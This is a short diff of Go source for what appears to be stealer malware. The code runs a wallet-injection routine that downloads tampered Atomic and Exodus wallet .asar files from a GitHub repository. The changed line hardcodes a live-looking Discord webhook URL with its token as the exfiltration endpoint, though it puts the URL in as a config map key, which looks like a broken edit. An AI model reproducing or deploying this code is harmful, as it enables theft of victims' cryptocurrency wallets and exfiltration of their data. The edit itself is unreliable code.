@@ -64,7 +64,7 @@ func main() {
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
 		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
+		CONFIG["https://discord.com/api/webhooks/1436396535972888709/QxUV2Va7SOGVqqsAIla4p4F9qRmcQbPnMbahDQUZ3PYTvmKABrMLvcCqvOUOEJDMyv4Z"].(string),
 	)
 
 	actions := []func(string){
